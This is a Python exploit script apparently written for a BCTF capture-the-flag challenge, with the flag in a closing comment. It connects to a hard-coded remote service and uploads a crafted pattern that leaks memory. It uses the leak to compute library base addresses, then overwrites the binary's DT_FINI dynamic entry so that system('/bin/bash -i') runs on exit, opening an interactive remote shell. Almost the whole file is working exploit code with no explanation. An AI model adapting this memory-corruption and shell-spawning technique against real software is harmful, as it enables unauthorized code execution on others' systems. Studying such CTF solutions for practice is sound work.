import sys
from socket import *
import ast
import re

TARGET = ('146.148.60.107', 6665)
#TARGET = ('54.173.230.97', 1556)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x

        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(x+'\n')
    print "<%s" % x

from struct import pack, unpack

cell_strings = ['|', '-', '*', ' ']

def cell_addr(byte_addr, nit, size):
    y, x = divmod(byte_addr, size/2)
    dy, dx = divmod(nit, 2)
    return (x*2+dx, y*2+dy)

def unmirror_addr(byte_addr, nit, size):
    x, y = cell_addr(byte_addr, nit, size*2)
    if 0 <= y < size:
        pass
    elif size <= y < 2*size:
        y = 2*size - y - 1
    else:
        raise ValueError("byte address %d out of range for size %d" % (byte_addr, size))
    if size <= x < 2*size:
        x = 2*size - x - 1
    return (x, y)

def empty_cells(size):
    return [[None] * size for _ in xrange(size)]

def to_cells(bytes, size):
    res = empty_cells(size)
    for i, c in enumerate(bytes):
        c = ord(c)
        for nit in xrange(4):
            x,y = cell_addr(i, nit, size)
            res[y][x] = (c >> (2*nit)) & 3
    return res

def to_bytes(cells):
    out = []
    size = len(cells)
    for i in xrange((size/2)**2):
        b = 0
        for nit in xrange(4):
            x,y = cell_addr(i, nit, size)
            if cells[y][x] != None:
                b |= cells[y][x] << (2*nit)
            else:
                b |= 2 << (2*nit)
        out.append(chr(b))
    return ''.join(out)

pattern = 0x0804B08C
pattern_size = 0x0804B2CC
pattern_generator = 0x0804B2D0

dynamic_start = 0x804b328 # 0x804b314
dynamic_size = 0x2c # 0xc8

dynamic2_start = 0x804b36c
dynamic2_size = 0x14

dynamic3_start = 0x804b39c
dynamic3_size = 0x14

dt_fini = 0x804b328
libc_base = 0xf75a3000 # XXX BRUTEFORCE [0xf7523000-0xf7622000]
#libc_base = 0xf7539000 # known for testing
#libc_base = 0xf7e42000 # fixed gdb offset
libc_gadget = 0xdb7b8
libc_system = 0x3ada0

gadget_edx = 0x804b324 # gadget uses edx and loads from edx+0xc and edx+0x24

dt_debug = 0x804b358
libdl_r_debug = 0x000228E4

def write_at(cells, addr, val):
    for i,c in enumerate(val):
        for nit in xrange(4):
            x, y = unmirror_addr(addr + i - pattern, nit, len(cells))
            if cells[y][x] != None:
                raise ValueError("Overlap at offset %d" % i)
            cells[y][x] = (ord(c) >> (2*nit)) & 3

bigsize = 96
pattern1 = empty_cells(26)
write_at(pattern1, pattern_size, pack('<I', bigsize))
write_at(pattern1, pattern_generator, pack('<I', 1))

rd('> '); pr('2') # upload
rd('? '); pr(str(len(pattern1))) # size of pattern
rd('? '); pr('x') # designer's name
rd('? \n'); s.send(to_bytes(pattern1)) # pattern bytes
rd('> '); pr('3') # save and return
rd('> '); pr('3') # trigger beautify
result = rd('> ')

def getslice(s, start, length):
    return s[start:start+length]
def setslice(s, start, obj):
    s[start:start+len(obj)] = obj
leaked = to_bytes([[cell_strings.index(c) for c in row[::2]] for row in result.split('\n')[1:bigsize+1]])
libdl_base = unpack('<I', getslice(leaked, dt_debug-pattern, 4))[0] - libdl_r_debug
print hex(libdl_base)

dynamic = list(getslice(leaked, dynamic_start-pattern, dynamic_size))
setslice(dynamic, dt_fini-dynamic_start, pack('<I', libc_gadget+libc_base))
setslice(dynamic, gadget_edx+0xc-dynamic_start, pack('<I', pattern))
setslice(dynamic, gadget_edx+0x24-dynamic_start, pack('<I', libc_system+libc_base))

pattern2 = empty_cells(46)
write_at(pattern2, dynamic_start, dynamic)
write_at(pattern2, dynamic2_start, getslice(leaked, dynamic2_start-pattern, dynamic2_size))
write_at(pattern2, dynamic3_start, getslice(leaked, dynamic3_start-pattern, dynamic3_size))
write_at(pattern2, pattern_size, pack('<I', len(pattern2)*2))
write_at(pattern2, pattern_generator, pack('<I', 1))
write_at(pattern2, pattern, '/bin/bash -i\0')
pr('2') # upload
rd('? '); pr(str(len(pattern2))) # size of pattern
rd('? '); pr('x') # designer's name
rd('? \n'); s.send(to_bytes(pattern2)) # pattern bytes
rd('> '); pr('3') # save and return
rd('> '); pr('3') # trigger beautify
rd('> '); pr('5') # exit, triggering DT_FINI
rd('Bye bye!\n')
pr('ls')
rd('\n')

s.settimeout(0.3)
while 1:
    while 1:
        try:
            bit = s.recv(4096)
            sys.stdout.write(bit)
        except timeout:
            break

    pr(raw_input()+'\n')

# flag = BCTF{ev3n_g0d_is_n0t_a_s3curity_eXp3rt}
